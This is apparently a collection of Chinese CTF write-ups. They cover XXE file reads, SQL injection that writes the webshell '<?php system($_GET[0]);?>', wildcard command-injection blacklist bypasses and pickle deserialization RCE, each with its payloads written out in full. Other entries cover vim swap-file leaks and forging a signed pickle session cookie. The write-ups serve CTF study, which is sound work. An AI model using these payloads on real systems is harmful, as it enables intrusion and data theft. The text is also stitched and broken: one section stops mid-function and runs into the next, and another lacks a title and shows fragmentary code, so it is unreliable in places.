    [NCTF2019] Fake XML cookbook — 名字就是答案

    题目类型：XXE（XML 外部实体注入）

    Flag：CTF2{72a5521b-e903-46b6-a937-056b82c51205}

    题目概述

    题名里直接写着 XML。

    这种“名字就是考点”的题，先别急着找别的洞——就按它说的方向走。

    解题过程

    Step 1：确认请求体是 XML

    页面源码里翻到登录逻辑，提交方式很明确：

    var data = "<user><username>" + username + "</username><password>" + password + "</password></user>";
$.ajax({
  type: "post",
  url: "doLogin.php",
  contentType: "application/xml",
  data: data
})

    三件事对上了：

    请求体是 XML           ← 拼接出来的标签结构
Content-Type 是 xml    ← application/xml
数据直接拼进去          ← 没有转义

    XML + 可控输入 = 先试 XXE。

    Step 2：加声明和引用，验证漏洞

    抓包，把请求体改成：

    <!DOCTYPE user [ <!ENTITY x "12"> ]>
<user>
  <username>&x;</username>
  <password>1</password>
</user>

    返回里 msg 变成了 12——说明实体被解析了，DTD 是生效的。

    第一步验证完成：这里能定义实体，也就能定义外部实体。

    Step 3：先读源码，确认为什么登录没用

    响应头带着 PHP，所以可以用 PHP 的伪协议。

    但要注意一个前提：外部实体读的是“文件原文”，不会经过 PHP 解析。想读源码就必须先 base64 编码，否则 <?php ... ?> 会被当成 XML 标签吞掉。**

    <!DOCTYPE user [ <!ENTITY x SYSTEM "php://filter/read=convert.base64-encode/resource=doLogin.php"> ]>
<user>
  <username>&x;</username>
  <password>1</password>
</user>

    把返回的 base64 解出来，就是 doLogin.php 的源码：

    $USERNAME = 'admin';
$PASSWORD = '024b87931a03f738fff6693ce0a78c88';
$result = null;

libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');

try {
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
    $creds = simplexml_import_dom($dom);
    $username = $creds->username;
    $password = $creds->password;

    if ($username == $USERNAME && $password == $PASSWORD) {
        $result = sprintf("<result><code>%d</code><msg>%s</msg></result>", 1, $username);
    } else {
        $result = sprintf("<result><code>%d</code><msg>%s</msg></result>", 0, $username);
    }
} catch (Exception $e) {
    $result = sprintf("<result><code>%d</code><msg>%s</msg></result>", 3, $e->getMessage());
}

    两个关键配置：

    libxml_disable_entity_loader(false);   // 允许加载外部实体
LIBXML_NOENT | LIBXML_DTDLOAD          // 替换实体 + 加载 DTD

    这就是漏洞的根源。

    Step 4：账号密码是假的线索

    源码里确实有账号和 md5 密码，但登进去没有任何东西——flag 不在数据库里，在文件系统上。

    所以这条路走完就丢掉，别在登录上耗时间。

    Step 5：直接读 flag

    把 resource= 换成 flag 文件即可：

    <!DOCTYPE user [ <!ENTITY x SYSTEM "php://filter/read=convert.base64-encode/resource=/flag"> ]>
<user>
  <username>&x;</username>
  <password>1</password>
</user>

    base64 解码：

    CTF2{72a5521b-e903-46b6-a937-056b82c51205}

    如果 flag 文件里都是纯文本、没有 <，也可以直接 SYSTEM "file:///flag"，省掉编码这一步。

    关键点 说明
    识别 题名 + Content-Type: application/xml + 拼接请求体
    验证 内部实体 <!ENTITY x "12"> 能生效，就说明 DTD 没关
    读源码 php://filter/read=convert.base64-encode/resource=xxx
    为什么编码 外部实体读的是原文，<?php 会破坏 XML 结构
    漏洞根源 libxml_disable_entity_loader(false) + LIBXML_NOENT
    登录没用 账号密码是真的，但 flag 不在库里
    完整 payload 
    <!DOCTYPE user [ <!ENTITY x SYSTEM "php://filter/read=convert.base64-encode/resource=/flag"> ]>
<user>
  <username>&x;</username>
  <password>1</password>
</user>

    POST /doLogin.php
Content-Type: application/xml
    这题踩的坑

    ① 只声明实体，不写 &x;

    实体是“登记”，引用才是“取值”。不引用，服务器根本不会去读文件。

    ② 用 file:// 读 PHP 源码

    读到的是原文，但 <?php 会被当成 XML 标签，解析直接炸。读源码必须走 php://filter + base64。

    ③ 拿账号密码去登录

    那是干扰项。flag 在文件里，不在数据库里。

    ④ 忘了 LIBXML_NOENT

    源码里 loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD) —— 少了 LIBXML_NOENT 实体不会被替换，你只能看到 &x; 本身。

    星辉魔女名鉴 — 库里没有 flag，那就写一个 shell 进去

    题目类型：SQL 注入 — INTO OUTFILE 写文件 getshell

    Flag：MYCTF{9f2c7a41-6d3b-4e85-b0a7-1c8f4d2e6b93}

    题目概述

    页面底部有个“终端”入口，进去是一块维护控制台。提示是日语的，先翻译：

    $ archive --status
[ ok ] 名鑑検索サービス: alive
[warn] 端末リリース 2.4.1 (legacy ・ 未統合フロント)

$ archive --storage
[info] エクスポート一時領域: /io/（書き込みは export 機能の実装後）
[info] 検索サービス本体は名鑑フロントから未接続

    翻译过来关键的就一行：

    导出临时区域：/io/（写入需在 export 功能实现后）

    这句话等于提前告诉你：/io/ 目录可写。后面所有操作都是围着这一句展开的。**

    解题过程

    Step 1：找注入点

    页面有个筛选框，输入 rarity >= 3 会返回一段 JSON，里面把拼好的 SQL 也打出来了：

    SELECT id, name, title, rarity, element, sig FROM witches WHERE rarity >= 3 ORDER BY id ASC

    输一个单引号（'），报错——注入点确认。

    Step 2：确定列数

    原查询是 6 个字段（id, name, title, rarity, element, sig），所以 UNION 也要 6 列：

    0 UNION SELECT 1,2,3,4,5,6

    能正常返回，说明列数对上了。

    Step 3：爆库表列

    6 UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),3,4,5,6 FROM INFORMATION_SCHEMA.TABLES-- -

    6 UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),3,4,5,6 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='archive_notes'-- -

    -- - 是注释掉后面原来的 ORDER BY id ASC（注意 -- 后面必须有一个空格）。

    扫出来的表里，与题目相关的就两张：witches（正常数据）和 archive_notes（看起来像隐藏内容）。

    Step 4：库里的“flag”是假的

    读 archive_notes，看到这么一条：

    封存样本（校验用，非本季名鉴凭证）：MYCTF{d3c0y_4rch1v3_n0t3_d0_n0t_submit}

    注意它自己写着 d3c0y_..._d0_n0t_submit——这是诱饵，交上去就是错的。**

    这题的 flag 不在数据库里。

    Step 5：看看能不能写文件

    既然提示说 /io/ 可写，先确认数据库的写权限目录：

    6 UNION SELECT 1,@@secure_file_priv,3,4,5,6-- -

    返回：

    /var/www/html/io/

    @@secure_file_priv 就是 MySQL/MariaDB 允许 INTO OUTFILE 写入的目录——和终端里那行提示完全对上了。

    这说明出题人是故意把这条路留给你。

    Step 6：写一个 webshell

    rarity >= 6 UNION SELECT 1,'<?php system($_GET[0]);?>',3,4,5,6 INTO OUTFILE '/var/www/html/io/C.php'-- -

    几个必须注意的地方：

    ① 路径用 @@secure_file_priv 给的那个，不能写别处
② INTO OUTFILE 不能覆盖已存在的文件（第一次写才成功，重写要换文件名）
③ 引号要小心：MySQL 写入时会把 " 转义成 \"，
   一旦变成 $_GET[\"cmd\"] 就是 PHP 语法错误 → 页面 500
④ 所以用 $_GET[0] 这种不带引号的写法最保险

    访问：

    /io/C.php?0=cat%20/flag

    得到：

    MYCTF{9f2c7a41-6d3b-4e85-b0a7-1c8f4d2e6b93}
    关键点 说明
    注入点 筛选条件 rarity，单引号报错确认
    列数 原查询 6 列，UNION 也要 6 列
    注释 -- -（-- 后必须空格），用来吃掉 ORDER BY
    提示的价值 终端已告知 /io/ 可写
    写权限目录 @@secure_file_priv = /var/www/html/io/，与提示吻合
    写 shell INTO OUTFILE + $_GET[0]（避开引号转义）
    诱饵 archive_notes 里的 d3c0y_... 是假的，别交
    完整流程 
    -- ① 确认列数
0 UNION SELECT 1,2,3,4,5,6

-- ② 爆表
6 UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),3,4,5,6 FROM INFORMATION_SCHEMA.TABLES-- -

-- ③ 看写权限目录
6 UNION SELECT 1,@@secure_file_priv,3,4,5,6-- -

-- ④ 写 shell
rarity >= 6 UNION SELECT 1,'<?php system($_GET[0]);?>',3,4,5,6 INTO OUTFILE '/var/www/html/io/C.php'-- -

    访问：/io/C.php?0=cat /flag
    这题踩的坑

    ① INFORMATION_SCHAME 拼错

    是 INFORMATION_SCHEMA。拼错不会报注入失败，只会返回空——很容易误判成“表不存在”。

    ② 忘了 -- - 注释

    后面那句 ORDER BY id ASC 还在，UNION 的结果会被排序吞掉，看起来像“没插进去”。

    ③ 双引号被 MySQL 转义

    $_GET["cmd"] 写进文件会变成 $_GET[\"cmd\"]，PHP 直接语法错误。用 $_GET[0] 或 $_GET[cmd]。

    ④ 反复往同一个文件名写

    INTO OUTFILE 不允许覆盖已存在文件。写失败就换个名字（C.php → D.php）。

    ⑤ 交了诱饵 flag

    archive_notes 里那条自己写着 d0_n0t_submit。库里没有真 flag，必须有写文件这一步。

    blindgl4g — 黑名单拦了 cat，但拦不住 /bin/ca?

    题目类型：命令注入 — 通配符绕过关键词黑名单

    Flag：MYCTF{7c1f4b02-3e9a-4d57-8ab6-2f0c9e5d1a83}

    题目概述

    跟着提示摸到 get_gl4g.php，页面直接把过滤规则吐了出来：

    /\b(flag|cat|tac|head|tail|more|less|nl|od|xxd|hexdump|base64|strings|grep|awk|sed|cp|mv|rm|ln|find|xargs|ls|dir|tree|wget|curl|nc|ncat|netcat|telnet|socat|ssh|scp|bash|sh|zsh|dash|php|python3|python|perl|ruby|lua|env|export|declare|eval)\b|[`$(){}<>|&'"]|\\/i

    这条正则把能用的东西几乎都封了：

    关键词    flag、cat、ls、sh、bash、python、grep、base64……
符号      反引号、$、(、)、{、}、<、>、|、&、单双引号、反斜杠

    但仔细看，;、?、*、/、=、空格都没在名单里。

    这就是突破口。

    解题过程

    Step 1：先看哪些字符还能用

    字符 状态 用处
    ; ✅ 没拦 串联多条命令（这是整题的前提）
    ? ✅ 没拦 单字符通配符
    * ✅ 没拦 多字符通配符
    / ✅ 没拦 路径分隔
    $ ( ) 反引号 ❌ 拦了 不能用命令替换 $(...)
    引号 ❌ 拦了 不能写字符串
    \| & ❌ 拦了 不能用管道和后台

    注意 \b 是词边界——它匹配的是“完整的单词”，比如 cat 作为独立词出现才算。

    这也意味着：只要让 cat 不以“完整单词”的形式出现，就能绕过去。

    Step 2：命令名和文件名都得“变形”

    要执行的两样东西，都在黑名单里：

    命令 cat        → 被拦
参数 /flag      → 里含 flag，被拦

    所以思路是：两个都用通配符拼出来，让它们的字面形式里既没有 cat 也没有 flag。**

    Step 3：/bin/ca? 为什么能变成 /bin/cat

    shell 执行命令时走 PATH，cat 实际指向 /bin/cat。

    所以直接写绝对路径就够了：/bin/cat。

    但这串里含 cat（/bin/cat 结尾就是 cat），照样被 \b 拦。

    那就把最后一个字符换成通配符：

    /bin/ca?

    shell 在展开通配符时，会去 /bin 目录里找所有“ca 开头、后面一个字符”的文件。

    /bin 下以 ca 开头的只有 cat——所以 ? 精准匹配到它。

    而字符串 /bin/ca? 里没有 cat 这三个连续字符，正则匹配不到。

    Step 4：/fla? 匹配 /flag

    同理，参数里的 flag 也要拆：

    /fla?

    文件系统里以 fla 开头的目标文件就是 /flag，? 匹配那个 g。

    字符串里没有 flag 这个完整单词，\b 拦不住。

    Step 5：拼起来

    ;/bin/ca? /fla?

    ; 是命令分隔符——前面可以什么都没有（或者接在一个已有参数后面），后面接我们的命令。

    为什么需要 ;：注入点通常在一段已有的 shell 语句里，前面不加分隔符，你写的命令会被当成前一条命令的参数。**

    请求一次，回显里直接看到：

    [2026-11-20 07:02:14] ;/bin/ca? /fla?
MYCTF{7c1f4b02-3e9a-4d57-8ab6-2f0c9e5d1a83}

    顺便，;id 也能跑：

    uid=33(www-data) gid=33(www-data) groups=33(www-data)

    说明命令确实执行了，不是回显注入。

    关键点 说明
    黑名单方式 关键词用 \b 词边界匹配，符号全部拉黑
    可用字符 ; ? * / = 空格
    ; 的作用 串联命令，把注入的命令和原语句分开
    通配符绕过 /bin/ca? → /bin/cat，字面量里不出现 cat
    参数绕过 /fla? → /flag
    为什么 ? 精准 /bin 下以 ca 开头的只有 cat；/ 下以 fla 开头的只有 flag
    还有其他可用姿势

    echo 不在黑名单里，可以直接列目录（不需要 ls）：

    ;echo /f*
;echo /bin/c*

    * 也会展开成路径，等于“用 echo 当 ls 用”。

    另外 ? 可以连续用：/fla?? 表示“fla + 两个字符”。

    这题踩的坑

    ① 只想着变形命令名，忘了参数也被拦

    cat 绕过了，但 /flag 里还有 flag，一样被 \b 拦住。两个都要变。

    ② 用 $(...) 或反引号

    这两个都被拉黑了。没有命令替换，只能靠通配符让 shell 自己展开。

    ③ 不加 ;

    注入点前面已经有命令了，不加分隔符，你的 /bin/ca? 会被当成上一条命令的参数传进去，什么都不会发生。

    ④ 以为 \b 是“包含”

    \b 是词边界。/bin/ca? 不含完整单词 cat，所以能过；如果黑名单写的是 strpos（子串匹配），这招就废了。判断过滤方式，决定了能不能用通配符。

    save_nailong — 六道门后面，钥匙写在 game.js 里

    题目类型：前端代码审计 — 全局函数 + 被 base64 藏起来的跳转参数

    Flag：MYCTF{n1l0ng_r3scu3d_1n_th3_fr0nt3nd}

    题目概述

    剧情给了三句关键信息：

    值班表上留了一行字：「深渊·加班之神」，六道门，它在最后一道后面。
你只有 3 分钟，一把剑，和十点伤害。

    “六道门”“最后一道后面”——暗示这游戏本身是障眼法，答案在代码里，不在游戏里。

    解题过程

    Step 1：先正常玩一局，看有没有网络请求

    F12 打开网络面板打一局，结果很干净：

    只有 game.js
攻击的时候没有任何请求

    Burp 也抓不到东西——说明这个游戏完全在前端跑，没有任何后端交互。

    那就说明：flag 不在后端，在 JS 里。

    Step 2：看 game.js（先解决乱码）

    直接打开 game.js，中文全是乱码。

    原因：服务器返回的 Content-Type 里没带 charset，浏览器就按系统默认编码（GBK）去解 UTF-8 的文件。

    三种查看方式，任选：

    # ① 下下来，按 UTF-8 打开
curl.exe -o game.js "http://目标/game.js"

# ② 直接转换输出
curl.exe -s "http://目标/game.js" | python -c "import sys;sys.stdout.write(sys.stdin.buffer.read().decode('utf-8'))"

# ③ DevTools → 调试器（Sources），它自己会按 UTF-8 显示

    第 ③ 种最省事——浏览器开发者工具里的源码视图不受响应头影响。

    Step 3：拉到最下面

    文件头部是模块说明，写着“13 本地验收残留（考点，勿删）”——作者自己把考点标出来了。

    直接拉到尾部，看到这段：

    var SAVE_TAG = ['bjFsMG5n', 'X2IzYXNy', 'XzIwMjY='];

function devGate() {
  location.href = 'nailong.php?pass=' + SAVE_TAG.map(atob).join('');

    海棠诗社·诗笺夹带 — 誊录官一字不改，那就把 flag 塞进诗里

    题目类型：XXE（XML 外部实体注入）— 绕过 file:// 过滤

    Flag：MYCTF{174907b1-c480-4128-83e2-efcb839b4b33}

    题目概述

    题目背景写得很讲究：

    诗笺不再手书，改以 XML 书就，交誊录官代为誊抄入册。
誊录官是个实诚人：笺上写什么，他便抄什么，一字不改。
听新闻社中那面小旗，就压在誊录官的案头（/flag）。

    “笺上写什么就抄什么，一字不改”——这就是在告诉你：服务器会原样解析并回显你提交的 XML。

    而那面小旗（flag）就在它案头，也就是 /flag 文件。

    所以思路很清楚：让 XML 解析器自己去读 /flag，再把内容抄给我。

    解题过程

    Step 1：先看 JS，找到提交入口

    页面里有个输入框，但按钮背后才是关键。翻页面源码里的脚本：

    try {
  const r = await fetch('/tengchao', {
    method: 'POST',
    headers: {'Content-Type': 'application/xml'},
    body: document.getElementById('x').value
  })

    三件事一眼看清：

    接口      POST /tengchao
类型      application/xml
请求体    输入框 #x 里的全部内容，原样提交

    也就是说：输入框里写什么 XML，服务器就拿什么去解析。

    Step 2：先确认后端语言（这一步很重要）

    我第一反应是 PHP 环境，于是去试 php://filter。

    结果报错里的堆栈信息显示是Java。

    这一步的价值：

    报错暴露语言 → 决定用哪套绕过思路
PHP  的伪协议        php://filter、php://input
Java 的 XML 解析     URI 处理更宽松，过滤常常形同虚设

    很多时候“过滤能不能绕”不取决于过滤写得严不严，而取决于解析器是谁。

    Step 3：file:// 被过滤，但 Java 不认这个死理

    直接写 file:///flag，被拦了——代码里过滤了 file:// 这个字符串。

    但 Java 的 XML 解析器在解析 SYSTEM 后面的值时，是按 URI 处理的，对斜杠数量并不敏感：

    SYSTEM "file:///flag"    ← 被过滤
SYSTEM "file:/flag"      ← 只有一个斜杠，能过
SYSTEM "/flag"           ← 干脆不带协议，也能过（当作绝对路径）

    所以这里不是“绕过过滤技巧”，是“过滤器假设错了写法”。它以为外部实体只有 file:// 一种形态。

    Step 4：写 payload

    <?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE 诗筏 [ <!ENTITY x SYSTEM "file:/flag"> ]>
<诗筏>
  <题名>&x;</题名>
  <落款></落款>
  <句>出浴太真冰作影</句>
  <句>捧心西子玉为魂</句>
</诗筏>

    三部分缺一不可：

    ① <!DOCTYPE ... [ <!ENTITY x SYSTEM "file:/flag"> ]>
   在 DTD 里声明一个实体 x，内容来自 file:/flag

② <题名>&x;</题名>
   在正文里**引用**它 —— 不引用，解析器根本不会去读文件

③ 保留原有的结构
   服务器要按模板把内容抄进“誊抄入册”，结构不对就走不到回显

    最容易漏的是第 ②：只声明实体、不引用，服务器什么都不会给你。**

    Step 5：提交，读结果

    把整段 XML 填进输入框，点提交。

    “誊抄入册”那块原样回显了：

    题名：MYCTF{174907b1-c480-4128-83e2-efcb839b4b33}
落款：
出浴太真冰作影
捧心西子玉为魂

    因为 &x; 在解析时被替换成了 /flag 文件的内容。

    关键点 说明
    入口 POST /tengchao，Content-Type: application/xml，body 完全可控
    判断语言 php://filter 报错 → 堆栈显示 Java
    Java 的宽松 SYSTEM 的值按 URI 解析，file:/、/flag 都能用
    过滤的误判 只过滤了 file:// 这个字符串，没想到还有别的写法
    XXE 三要素 声明实体 → 引用实体 → 保持原结构走到回显
    文件路径 /flag（题目描述里直接给了）
    完整 payload 
    <?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE 诗筏 [ <!ENTITY x SYSTEM "file:/flag"> ]>
<诗筏>
  <题名>&x;</题名>
  <落款></落款>
  <句>出浴太真冰作影</句>
  <句>捧心西子玉为魂</句>
</诗筏>
    这题踩的坑

    ① 只声明实体，不在正文引用

    <!ENTITY x SYSTEM "..."> 只是“登记”，解析器不会主动去读。必须在正文里写 &x; 才会触发读取和替换。

    ② 被 file:// 拦住就放弃

    过滤的是字符串，不是语义。file:/、file:、直接写绝对路径，都能达到同一个效果。

    ③ 没先判断后端语言

    PHP 的 php://filter 在 Java 里当然报错。报错本身就是信息——它告诉你该换哪一套思路。

    ④ 改了 XML 结构

    服务器的模板要求特定标签（<题名>、<句>），结构改坏就走不到回显那一步，哪怕实体读到了也没用。

    ctfshow — vim 临时文件泄露：服务器崩了，源码留在磁盘上

    题目类型：信息收集 — vim 交换文件（.swp）泄露源码

    Flag：ctfshow{ef6a863e-b17d-42be-b23d-56e6065f6581}

    题目概述

    题目就一句话：

    发现网页有个错别字？赶紧在生产环境 vim 改下，不好，死机了

    这句话不是在讲段子，是在交代“源码曾经被 vim 打开过，而且没正常退出”。

    靶场默认开 https，浏览器里删掉 s 换 http 有时能少踩证书的坑（这题两种都行）。

    解题过程

    Step 1：读懂提示

    vim 在编辑文件时不是“直接改原文件”，它会生成一个交换文件（swap file）放在同目录下。

    作用有两个：

    ① 崩溃/断电后能恢复没保存的改动
② 防止两个人同时编辑同一个文件

    如果 vim 被异常终止（进程被杀、机器死机、SSH 断线），这个交换文件不会被删除，就留在 Web 目录里。

    而 Web 目录里的东西——能通过 HTTP 直接下载。

    这就是“vim 临时文件泄露”。

    Step 2：交换文件叫什么名字

    vim 的命名规则是：在原文件名前面加一个点，后面加 .swp。

    原文件      index.php
交换文件    .index.php.swp

    如果同一个文件已经被打开过多次（上一次的 swp 没清），后缀会往后排：

    .index.php.swp    第一次
.index.php.swo    第二次
.index.php.swn    第三次

    另外还有两种常见的“vim 残留”：

    index.php~          备份文件（backup）
.index.php.un~      undo 文件

    扫目录时把这几个后缀一起加上，命中率很高。

    Step 3：把文件下下来

    curl.exe -s -k "https://目标/.index.php.swp" -o index.php.swp

    用 -k 是因为靶场是自签证书。

    下下来先确认是不是真的 swp：

    Format-Hex -Path index.php.swp -Count 64

    开头应该是 b0VIM 这四个字节（0x62 0x30 0x56 0x49 0x4D）——这是 vim 交换文件的魔数。

    Step 4：从 swp 里把源码还原出来

    swp 是二进制文件（里面是分块保存的文本 + 元信息），不能直接 cat 当源码读，但文本块是明文存放的，所以有两种办法：

    ① 用 vim 自己恢复（最干净）

    vim -r index.php.swp

    vim 会提示恢复，确认后 :w index_recovered.php 存出来。

    ② 直接抽可打印字符串（最快）

    strings index.php.swp | Select-String "flag|<?php|function"

    Windows 上没有 strings 的话，用 Python 也行：

    import re
data = open("index.php.swp", "rb").read()
print("".join(chr(b) if 32 <= b < 127 else "\n" for b in data))

    两种都能看到源码——这题的 flag 就在里面：

    ctfshow{ef6a863e-b17d-42be-b23d-56e6065f6581}
    关键点 说明
    触发条件 vim 异常退出（死机/断连/被杀），swp 留在 Web 目录
    命名规则 .原文件名.swp，如 .index.php.swp
    多次打开 后缀顺延 .swo / .swn
    其他残留 index.php~（备份）、.index.php.un~（undo）
    文件特征 开头 b0VIM（魔数），二进制但文本块明文
    还原方式 vim -r xxx.swp 或 strings 抽取
    题目提示的作用 “死机了”就是在告诉你“没正常退出 → swp 还在”
    目录扫描时该加的后缀 
    .swp  .swo  .swn  .swx  .un~  ~  .bak  .old  .orig

    dirsearch 里对应 -e php,swp,swo,swn,bak,old,orig,txt。

    这题踩的坑

    ① 文件名写成 index..php.swp

    多了一个点。规则是“点 + 原文件名 + .swp”，原文件名本身就带 .php，所以是 .index.php.swp。

    ② 把 swp 当普通文本打开

    它是二进制块文件，直接打开会看到一堆乱码。用 vim -r 恢复，或者用 strings 抽可打印字符。

    ③ 只试了 .swp 没试 .swo

    如果那个文件被 vim 打开过两次，第一次的 swp 可能已经变成 swo。后缀要一起试。

    ④ 忽略了 index.php~

    备份文件是纯文本，比 swp 还好读。看到 ~ 结尾的文件优先下它。

    题目概述

    进靶场直接给源码。先把缩进换行整理一遍再读——粘出来格式全乱了，Shift+Alt+F 走一下。

    解题过程

    Step 1：读源码，两个点连起来看

    @app.route('/')

    with open('app.py', 'r') as f:
        return f.read()

@app.route('/calc', methods=['GET'])
def getflag():

    pickle.loads(base64.b64decode(payload).replace(b'os', b''))
    return "ganbadie!"

@app.route('/readFile', methods=['GET'])
def readFile():
    filename = request.args.get('filename').replace("flag", "?????")
    with open(filename, 'r') as f:
        return f.read()

    三个路由各司其职：

    /          直接把源码吐出来（等于免费给源码）
/calc      base64 解码 → pickle.loads → 反序列化执行
/readFile  读任意文件，但文件名里的 "flag" 会被替换成 "?????"

    所以这题的结构是：

    /calc 负责执行命令（把结果写到文件里）
/readFile 负责把文件读出来（但文件名不能带 flag）

    两个点必须连起来用——一个没有回显，另一个不能读带 flag 名字的文件。

    Step 2：/calc 的过滤怎么绕

    pickle.loads(base64.b64decode(payload).replace(b'os', b''))

    注意执行顺序：先 base64 解码，再对解码出来的字节做 os 替换。

    所以只要 payload 里出现连续的 os，就会被删掉——pickle.loads 直接炸。

    绕过方式：字符串拼接。

    '__import__("o" + "s").system("id")'

    在 pickle 的字节流里，o 和 s 是两个独立的字符，不会形成连续的 os；到运行时它们才拼成 os。

    这是“过滤字符但是执行时拼接”的通用思路。

    Step 3：构造 pickle payload

    class evil:
    def __reduce__(self):
        import os
        return (eval, ("__import__('o'+'s').system('env > x.txt')",))

new = base64.b64encode(pickle.dumps(evil(), protocol=4)).decode()
print(urllib.parse.quote(new))

    三个要点：

    ① __reduce__：反序列化时返回 (可调用对象, 参数) → 服务器执行 eval(...)
② 'o'+'s' 拼接：避开 replace(b'os', b'')
③ urllib.parse.quote：base64 里的 + 必须做 URL 编码

    Step 4：为什么 + 必须编码（这题卡最久的地方）

    base64 的字符集里包含 +，而 + 放在 URL 的 query 里会被解码成空格。

    于是你发出去的是：

    /calc?payload=gAN9cQAo...ab+cd...

    服务器收到的 payload 已经变成：

    gAN9cQAo...ab cd...

    中间多了一个空格，base64 解码直接失败——而 /calc 成功时只返回 ganbadie!，失败时也没有明显报错，看起来就像“没反应”。

    所以脚本最后一定要 quote()：

    +  →  %2B

    这也是为什么用 curl -G --data-urlencode 更省事——它替你编码。

    Step 5：第一次读到的“flag”是假的

    先 cat /f*，写进 x.txt，再用 /readFile?filename=./x.txt 读回来：

    flagnothere

    是个干扰文件。

    接着 ls /，根目录下只有一个 flag.sh——读出来也不是真的。

    那就换方向：看环境变量。

    "__import__('o'+'s').system('env > x.txt')"

    /readFile?filename=./x.txt 读回来，flag 在环境变量里：

    NSSCTF{4344aed6-c797-4af0-9a97-f8ab871aad19}
    关键点 说明
    /calc pickle.loads(b64decode(payload)) → 反序列化即执行
    过滤 .replace(b'os', b'') 作用在解码后的字节上
    绕过 'o' + 's' 拼接，字节流里不出现连续 os
    /readFile 文件名里的 flag 会被替换成 ????? → 必须换个名字写
    读写配合 /calc 写文件、/readFile 读回来（无回显题的常规套路）
    + 的坑 base64 的 + 在 query 里会被当空格，必须 quote()
    假 flag flagnothere、/flag.sh 都是干扰，真正的在环境变量
    完整 payload 
    import base64
import pickle
import urllib.parse

class evil:
    def __reduce__(self):
        return (eval, ("__import__('o'+'s').system('env > x.txt')",))

new = base64.b64encode(pickle.dumps(evil(), protocol=4)).decode()
print(urllib.parse.quote(new))

    curl.exe -s -G --data-urlencode "payload=gAN9cQAo...（上面输出的结果）" "http://目标/calc"
curl.exe -s -G --data-urlencode "filename=./x.txt" "http://目标/readFile"
    这题踩的坑

    ① __import__['o'+'s'] 写成了下标

    那是函数调用不是取下标，必须写 __import__('o'+'s')。写成方括号，eval 直接抛 TypeError，而 /calc 失败时页面没反馈，很难察觉。

    ② base64 的 + 没编码

    query 里的 + → 空格 → base64 解码失败。表现是“页面没反应”，不是报错。这是这题最容易卡住的地方。

    ③ 想直接 /readFile?filename=/flag

    源码里 filename.replace("flag", "?????")——连路径里的 flag 都会被替换。所以必须先把内容写到另一个名字的文件里（x.txt），再读那个文件。

    ④ 只在根目录找 flag

    cat /f* 出来 flagnothere、ls / 只有一个 flag.sh。真 flag 在环境变量里（env）。

    [watevrCTF-2019] Pickle Store — 改完钱还得把签名一起算对

    题目类型：Python 反序列化 — pickle session + HMAC 签名伪造

    Flag：CTF2{eea2f800-cc38-47ee-bc10-05205f709eb8}

    题目概述

    一个卖腌黄瓜的商店。目标很明确：买下那个 $1000 的 Flag Pickle。

    但初始资金不够。页面顶上显示 Your funds: $998999（这是改成功之后的样子，初始只有 500）。

    于是问题变成：怎么让服务器相信我有钱。

    解题过程

    Step 1：先随便买几个，看看有没有别的反馈

    点了标准腌黄瓜（$10）和 Smörgåsgurka（$100），除了 history 里多两条记录，没有别的反应。

    真正的东西在 cookie 里。

    Step 2：session cookie 是 base64 过的 pickle

    抓包看到一个 session cookie，长得像 base64：

    gAN9cQAoWAAAA...（很长）

    base64 解一次，得到的是二进制——而且开头是 \x80\x04\x95，这是 pickle 的协议头。

    Python 的 session 直接把字典 pickle 完再 base64 塞进 cookie，等于把内部对象结构交给客户端保存。

    Step 3：解开看结构

    import pickle, base64

data = pickle.loads(base64.b64decode(session_cookie))
print(data)

    得到一个字典：

    {
  'money': 500,
  'history': ['Yummy smörgåsgurka', 'Yummy standard pickle'],
  'anti_tamper_hmac': '29ea7e88282f92f4ffc2976f14905697'
}

    三个键：钱、购买记录、还有一个防篡改的 HMAC。

    Step 4：直接改 money —— 失败

    第一反应是 data['money'] = 1000000，重新 pickle + base64，替换 cookie。

    结果页面上钱还是 500。

    原因就是第三个键：anti_tamper_hmac。

    服务端每次收到请求都会重新算一遍 HMAC，和你 cookie 里带来的那个比。对不上，就用默认的 money=500 重建 session。

    所以光改值不行，签名也得跟着对。

    Step 5：顺手试一下 pickle 本身能不能执行代码

    pickle 反序列化的经典利用是 __reduce__：

    class evil:
    def __reduce__(self):
        import os
        return (eval, ("__import__('os').system('sleep 5') or 0",))

payload = base64.b64encode(pickle.dumps(evil(), protocol=4)).decode()

    把 session 换成这个 payload，页面确实延迟了 5 秒——说明服务器在反序列化的那一刻就执行了我们的代码。

    接着试了把 ls 的结果写到 static/ 目录下，再从浏览器去访问，打不开。这条路放弃。

    Step 6：去 GitHub 找源码

    作者把源码开源在 GitHub 上。翻到处理 session 的那段：

    h = hmac.new(key)
h.update(str(cookies).encode())
cookies["anti_tamper_hmac"] = h.digest().hex()
resp.set_cookie("session", base64.b64encode(pickle.dumps(cookies)))
return resp

    然后把 key 也找到了：

    key = b"58c93becce9a13c96778ded0edd8096d"

    这里要注意两个细节：

    ① HMAC 用的是 md5（源码里 hmac.new(key, digestmod=hashlib.md5)）
② 参与计算的是 str(cookies)，而且是在**加入 anti_tamper_hmac 之前**的字典

    也就是说：服务端把你 cookie 里的 money 和 history 拼成 Python 字典的字符串形式，再算 HMAC。

    知道 key，我们就能自己算出一个合法的签名。

    Step 7：本地构造 + 签名 + 替换

    import base64
import pickle
import hmac
import hashlib

key = b"58c93becce9a13c96778ded0edd8096d"

h = hmac.new(key, digestmod=hashlib.md5)

# 注意顺序：和服务器保持一致，先 money 再 history
cookies = {"money": 999999, "history": []}
h.update(str(cookies).encode())

# 算完再把签名塞进去
cookies["anti_tamper_hmac"] = h.digest().hex()

print(base64.b64encode(pickle.dumps(cookies, protocol=4)).decode())

    把这个输出替换掉浏览器的 session cookie，刷新——钱变成了 $998999。

    然后点 Flag Pickle 的 Buy。

    拿到：

    CTF2{eea2f800-cc38-47ee-bc10-05205f709eb8}
    关键点 说明
    session 格式 base64(pickle.dumps(dict))，客户端持有完整对象
    防篡改 anti_tamper_hmac，服务端每次重算并比对
    参与签名的内容 str(cookies)，且不包含 anti_tamper_hmac 自身
    字典顺序 Python 3.7+ 保持插入顺序，str(dict) 的结果依赖它，必须和服务器一致
